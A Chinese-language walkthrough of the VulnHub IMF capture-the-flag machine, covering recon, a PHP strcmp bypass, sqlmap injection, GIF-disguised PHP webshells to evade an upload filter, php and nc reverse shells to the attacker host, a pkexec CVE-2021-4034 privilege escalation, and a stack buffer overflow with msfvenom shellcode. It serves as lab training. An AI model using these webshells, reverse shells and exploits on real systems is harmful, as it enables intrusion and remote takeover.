# 8-IMF

靶机地址：https://www.vulnhub.com/entry/imf-1,162/  
靶机难度：中级（CTF）  
![image](https://image.3001.net/images/20220414/1649946052_62582dc493e056749a244.png!small)

## 1.信息收集

### nmap

    
    
    nmap 192.168.75.0/24 -sP
    

![image](https://image.3001.net/images/20220414/1649945993_62582d895cc1476ef6c99.png!small)

    
    
    nmap 192.168.75.13 -sS -sV -A -T4
    

![image](https://image.3001.net/images/20220414/1649946007_62582d975147e358ea24c.png!small)

### curl

    
    
    curl http://192.168.75.13
    ZmxhZzJ7YVcxbVl
    XUnRhVzVwYzNS
    eVlYUnZjZz09fQ==
    ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
    

![image](https://image.3001.net/images/20220414/1649946082_62582de23801a99c5b539.png!small)

    
    
    也可以右键查看源代码
    flag1{YWxsdGhlZmlsZXM=}
    http://www.hiencode.com/base64.html
    allthefiles
    

![image](https://image.3001.net/images/20220414/1649946107_62582dfba5ca0a05c4762.png!small)

    
    
    echo 'ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==' | base64 -d 
    flag2{aW1mYWRtaW5pc3RyYXRvcg==} 
    echo 'aW1mYWRtaW5pc3RyYXRvcg==' | base64 -d
    imfadministrator
    

![image](https://image.3001.net/images/20220414/1649946127_62582e0f33334b76196e7.png!small)

    
    
    尝试访问 http://192.168.75.13/imfadministrator/
    curl http://192.168.75.13/imfadministrator/
    

![image](https://image.3001.net/images/20220414/1649946173_62582e3d151b690a97d7b.png!small)

![image](https://image.3001.net/images/20220414/1649946180_62582e44d486cfab17693.png!small)

    
    
    返回contact.php
    http://192.168.75.13/contact.php
    发现三个账户名
    rmichaels
    akeith
    estone
    

![image](https://image.3001.net/images/20220414/1649946193_62582e5146346676ccfdf.png!small)

    
    
    尝试登录查看回显
    rmichaels 是正确账户名
    

![image](https://image.3001.net/images/20220414/1649946211_62582e638c9f5d7124a13.png!small)

    
    
    参考php strcmp比较字符串绕过：字符串和数组进行比较
    http://www.atkx.top/2020/11/04/代码审计之弱类型绕过/
    
    字符串转换为数组：
    我将字段名称更新pass为pass[]，这意味着PHP将把这个字段解释为一个数组，而不是一个字符串。这有时会混淆验证字符串检查，如果输入是数组strcmp则会返回NULL！
    
    flag3{Y29udGludWVUT2Ntcw==}
    continueTOcms
    

![image](https://image.3001.net/images/20220414/1649946295_62582eb7acbc690b32a1a.png!small)

![image](https://image.3001.net/images/20220414/1649946305_62582ec18131cbaaabc8d.png!small)

![image](https://image.3001.net/images/20220414/1649946317_62582ecd086b6728fb095.png!small)

### burp+sqlmap

    
    
    点击IMF CMS
    用burpsuite拦截流量包，右键点击：copy to file 保存到本地8-bp.txt文本中
    cat 8-bp.txt
    

![image](https://image.3001.net/images/20220414/1649946344_62582ee8c6a328bb72336.png!small)

![image](https://image.3001.net/images/20220414/1649946364_62582efcb00bdde783a69.png!small)

    
    
    sqlmap -r 8-bp.txt --dump
    database admin
    table pages
    
    ./images/whiteboard.jpg
    ./images/redacted.jpg
    

![image](https://image.3001.net/images/20220414/1649946377_62582f09df33774bbb4b0.png!small)

    
    
    访问 http://192.168.75.13/imfadministrator/images/whiteboard.jpg
    草科二维码解码 https://cli.im/deqr
    flag4{dXBsb2Fkcjk0Mi5waHA=}
    echo 'dXBsb2Fkcjk0Mi5waHA=' | base64 -d
    uploadr942.php
    

![image](https://image.3001.net/images/20220414/1649946392_62582f18351237c9b55b3.png!small)

![image](https://image.3001.net/images/20220414/1649946419_62582f33e691446cc1a0e.png!small)

![image](https://image.3001.net/images/20220414/1649946427_62582f3b592c07730709b.png!small)

    
    
    访问http://192.168.75.13/imfadministrator/uploadr942.php
    经过尝试允许上传jpg、png、gif 
    但是存在waf，利用双扩展名或空字符都无法绕过waf
    

![image](https://image.3001.net/images/20220414/1649946437_62582f4548d68a0ca46bf.png!small)

## 2-webshell

### gif ``绕过waf

    
    
    参考文章 https://stackoverflow.com/questions/3597082/how-is-a-website-hacked-by-a-maliciously-encoded-image-that-contained-a-php-scr
    通过插入GIF89a十六进制标头并附加，WAF没有发现为恶意的php代码来创建一个gif文件。
    
    
    
    这里按照文章方法，然后双引号、单引号都无法利用绕过waf，这里参考文章：
    https://blog.csdn.net/vspiders/article/details/70162604
    反引号中，变量转义作为shell命令被执行！
    
    echo 'GIF89a <?php echo `id`; ?>' > shell.gif
    上传 发现上传后的文件 被编码
    回显：File successfully uploaded.  成功绕过waf！
    

![image](https://image.3001.net/images/20220414/1649946480_62582f70d76b8cf12d4c8.png!small)

    
    
    访问 http://192.168.75.13/imfadministrator/uploads/e023b3beb5.0a.gif
    由回显可知 常穿的shell  相当于在终端 id
    

![image](https://image.3001.net/images/20220414/1649946583_62582fd7b7363940ddf8d.png!small)

    
    
    https://zhuanlan.zhihu.com/p/25049406
    知道JPG／JPEG文件会是FFD8FFE0为文件头！
    
    echo 'FFD8FFE1' | xxd -r -p > jpg.gif
    echo '<?php $jpg=$_GET['jpg']; echo `$jpg`; ?>' > jpg.gif
    xxd创建一个hexdump，使用组合-r和-p读取没有行号信息和特定列布局的普通十六进制转储。
    这个也是可以的
    
    png目前不知道怎么绕过
    

![image](https://image.3001.net/images/20220414/1649946604_62582fec4b21dbe2f9ea7.png!small)

### php 一句话木马

    
    
    上传一句话木马
    echo 'GIF89a <?php $cmd=$_GET['cmd']; echo `$cmd`; ?>' > cmd.gif
    http://192.168.75.13/imfadministrator/uploads/22143936f90b.gif?cmd=id
    GET 传参 id 传给cmd 再执行
    

![image](https://image.3001.net/images/20220414/1649946612_62582ff40a01c12849bbd.png!small)

    
    
    cmd=ls
    flag5_abc123def.txt
    
    cmd=cat flag5_abc123def.txt
    flag5{YWdlbnRzZXJ2aWNlcw==}
    
    echo 'YWdlbnRzZXJ2aWNlcw==' | base64 -d
    agentservices
    

![image](https://image.3001.net/images/20220414/1649946629_6258300561b4de21c080d.png!small)

![image](https://image.3001.net/images/20220414/1649946638_6258300e9ffa423c2809d.png!small)

![image](https://image.3001.net/images/20220414/1649946648_6258301884539f57cccd6.png!small)

### 反弹shell

    
    
    利用kali本地反弹shell
    cp /usr/share/webshells/php/php-reverse-shell.php shell.php
    修改信息
    

![image](https://image.3001.net/images/20220414/1649946661_625830254e2822d5834bd.png!small)

    
    
    本机开启httpserver
    python -m SimpleHTTPServer 8081
    cmd=wget http://192.168.75.5:8081/shell.php
    cmd=ls
    

![image](https://image.3001.net/images/20220414/1649946679_625830372bd3f288ad48a.png!small)

    
    
    bash /临时切换shell 到bash
    nc -lvp 6688
    访问 http://192.168.75.13/imfadministrator/uploads/shell.php
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ctrl+z
    stty rawo -echo
    fg
    nc -lvp 6688
    

![image](https://image.3001.net/images/20220414/1649946691_62583043724bdcbb8af1c.png!small)

### weevely 绕过waf

    
    
    weevely generate passweevely weevely.php
    cat weevely.php
    mv weevely.php weevely.gif 
    vim weevely.gif 添加上 gif头部GIF98a
    cat weevely.php
    然后上传
    

![image](https://image.3001.net/images/20220414/1649946763_6258308b69c1f927b3b17.png!small)

    
    
    weevely http://192.168.75.13/imfadministrator/uploads/cd73dccf5987.gif passweevely
    

![image](https://image.3001.net/images/20220414/1649946785_625830a1ee50ac363bb9e.png!small)

### why gif解析php

    
    
    cd /var/www/html/imfadministrator/uploads ---进入文件上传目录
    ls -la  ---查看到存在.htaccess
    cat查看信息：
    AddType application/x-httpd-php .php .gif
    AddHandler application/x-httpd-php .gif
    可看到该文件与继续gif解析php文件！
    

![image](https://image.3001.net/images/20220414/1649946801_625830b18c5333a7442ed.png!small)

## 3-提权

### bashshell

    
    
    nc -lvp 6688
    php -r '$sock=fsockopen("192.168.75.5",6688);exec("/bin/sh -i <&3 >&3 2>&3");'
    
    python3 -c 'import pty; pty.spawn("/bin/bash")' 
    ctrl+z
    stty raw -echo
    fg
    nc -lvp 6688
    

![image](https://image.3001.net/images/20220414/1649946816_625830c03e46430957a71.png!small)

### cve-2021-4034-poc.c

    
    
    python -m SimpleHTTPServer 8081
    wget http://192.168.75.5:8081/cve-2021-4034-poc.c
    gcc cve-2021-4034-poc.c -o exp
    chmod +x exp
    ./exp
    cd /root
    ls
    cat Flag.txt
    echo 'R2gwc3RQcM.90MGMwbHM=' | base64 -d
    Gh0stProt0c0ls
    

![image](https://image.3001.net/images/20220414/1649946862_625830ee98f0488806ceb.png!small)

## 4-缓冲区溢出

### agent

通过flag5 base64解码获得：agentservices  
这是提示agent的服务存在问题！

    
    
    find / -name agent 2>/dev/null 
    /usr/local/bin/agent
    /etc/xinetd.d/agent
    
    查看文件信息
    ls -al /usr/local/bin/agent
    file /usr/local/bin/agent
    可执行文件
    ls -al /etc/xinetd.d/agent
    file /etc/xinetd.d/agent
    发现端口7788 root权限运行
    

![image](https://image.3001.net/images/20220414/1649946882_62583102a9a9c49a9f621.png!small)

    
    
    netstat -ant
    

![image](https://image.3001.net/images/20220414/1649946924_6258312c22b40d8f4935e.png!small)

### 端口碰撞

    
    
    cd /usr/local/bin/
    ls
    cat access_codes
    

![image](https://image.3001.net/images/20220414/1649946946_625831424da2415711a32.png!small)

    
    
    knock 192.168.75.13 7482 8279 9467 -v 
    nmap 192.168.75.13 -p7788
    nc 192.168.75.13 7788
    

![image](https://image.3001.net/images/20220414/1649946956_6258314c0477f75c90b88.png!small)

### base64下载

    
    
    md5sum agent
    fabc1afd43f668df0b812213567d032c
    base64 agent
    
    vim base64.txt //将base64码复制进去
    cat base64.txt | base64 -d > agent
    chmod +x agent
    md5sum agent
    fabc1afd43f668df0b812213567d032c
    

![image](https://image.3001.net/images/20220414/1649946969_62583159941c84b6f593a.png!small)

### ltrace追踪

    
    
    ltrace ./agent
    随意输入数字！ //我这里输入的1
    strncmp("dwqdq\n", "48093572", 8)  = -1 
    //正在将我提供的字符串与字符串48093572进行比较，在这种情况下导致=-1）
    

![image](https://image.3001.net/images/20220414/1649946981_625831650c9dd27766c9d.png!small)

### strings分析

    
    
    strings agent
    两个地方使用了“%s”，这很可能是一个有效的溢出点！
    Location: %s
    Report: %s
    

![image](https://image.3001.net/images/20220414/1649946988_6258316cacad536a84990.png!small)

### gdb分析

    
    
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
    生成1200个字符
    

![image](https://image.3001.net/images/20220414/1649947003_6258317b56076dbcbea49.png!small)

    
    
    gdb ./agent
    run
    48093572
    
    输入2000值后，发现segmentation fault溢出报错！存在缓冲区溢出！
    0x41366641
    
    堆栈开始是EAX寄存器
    EAX: 0xffffcfd4
    

![image](https://image.3001.net/images/20220414/1649947021_6258318d046dc1e216612.png!small)

![image](https://image.3001.net/images/20220414/1649947035_6258319b2ad6459d205df.png!small)

    
    
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41366641
    发现偏移量为：168
    

![image](https://image.3001.net/images/20220414/1649947046_625831a6b8fbb9533f90d.png!small)

    
    
    python -c 'print "A" * 168 + "B" * 4'
    通过测试：
    EAX: 0xffffcfd4 ('A' <repeats 152 times>, "\324\317\377\377", 'A' <repeats 15 times>, "BBBB")
    EIP被168个字节覆盖，但是多给的B字节走到了EAX上，在给多个C测试shellcode会走哪儿！
    
    python -c 'print "A" * 168 + "B" * 4 + "CCCCCCCCCCCCCCCC"'
    EAX: 0xffffcfd4 ('A' <repeats 152 times>, "\324\317\377\377", 'A' <repeats 12 times>, "BBBB", 'C' <repeats 16 times>)
    
    C也走到了EAX，找保护措施！那么只需要找到eax值，即可直接跳到shellcode！
    

![image](https://image.3001.net/images/20220414/1649947059_625831b3aba4023456c4d.png!small)

![image](https://image.3001.net/images/20220414/1649947068_625831bc6d819950a4158.png!small)

    
    
    checksec
    CANARY    : disabled
    FORTIFY   : disabled
    NX        : disabled
    PIE       : disabled
    RELRO     : Partial
    
    RELRO 是一种用于加强对 binary 数据段的保护的技术。
    参考：https://lantern.cool/note-pwn-linux-protect/
    

![image](https://image.3001.net/images/20220414/1649947082_625831ca0d3755223ff04.png!small)

### ALSR

    
    
    cat /proc/sys/kernel/randomize_va_space
    2
    或者：
    sysctl -a --pattern randomize
    kernel.randomize_va_space = 2
    
    0 = 关闭
    1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）
    2 = 全随机。除了1中所述，还有heap。
    说明存在随机化！ASLR功能的程序使用ret2reg（返回寄存器）指令来利用缓冲区溢出
    
    参考大佬：
    https://www.securitylab.ru/analytics/405868.php
    

![image](https://image.3001.net/images/20220414/1649947098_625831da0a7e0753f2ee7.png!small)

### JMP shellcode

    
    
    gdb-peda$ jmpcall eax
    0x8048563 : call eax
    
    asmsearch "jmp eax"
    asmsearch "call eax"
    
    EAX 地址0x8048563
    

![image](https://image.3001.net/images/20220414/1649947105_625831e112237f3e78281.png!small)

    
    
    目前知道了JMP值：0x8048563
    偏移量：168
    
    接下来shellcode：避免使用空字符和换行符
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.75.5 LPORT=6666 -f python -b "\x00\x0a\x0b"
    
    payload：
    -p 载荷类型
    LHOST 本机地址
    LPORT
    -b 坏字符
    -f 编译的语言
    \x00 == 0x00 ASCII控制字符表中对应 NULL (空字符)
    \x0a == 0X0a ASCII控制字符表中对应 LF （换行键）
    \x0b == 0x0b ASCII控制字符表中对应 VT (垂直定位符号)
    

![image](https://image.3001.net/images/20220414/1649947117_625831ed2fd93e27e57e6.png!small)

    
    
    需要运行，在输入密码，在输入ID，才能进行缓冲区溢出，这时候需要expect的特殊脚本语言来写：
    https://en.wikiped
    ia.org/wiki/Expect
    
    
    
    代码
    client.recv(512) 中recv是recvsize的缩写，
    参考：https://blog.csdn.net/momod/article/details/105883550
    当使用socket模块，在接收请求数据时一般用s.recv()函数。
    这个函数有一个bufsize参数，指定要接受的最大数据量。
    一般教程会推荐设定这个值为1024。如这个简单的服务器代码：
    

![image](https://image.3001.net/images/20220414/1649947128_625831f8410ffc3473b29.png!small)

![image](https://image.3001.net/images/20220414/1649947144_625832089629d8d9d5f31.png!small)

    
    
    python exp.py
    //python exp2.py
    

![image](https://image.3001.net/images/20220414/1649947154_625832125187c852f2426.png!small)

## 5.资料

    
    
    教学如果写py脚本对付缓冲区溢出
    参考文章：
    https://zhuanlan.zhihu.com/p/387321917
    脚本：
    https://github.com/hum4nG0D/OSCP_Bufferovrflw_Prep
    https://github.com/corelan/mona
    
    缓冲区溢出非常好的文章：
    https://secnigma.wordpress.com/2021/04/05/an-introduction-into-linux-buffer-overflow/
    

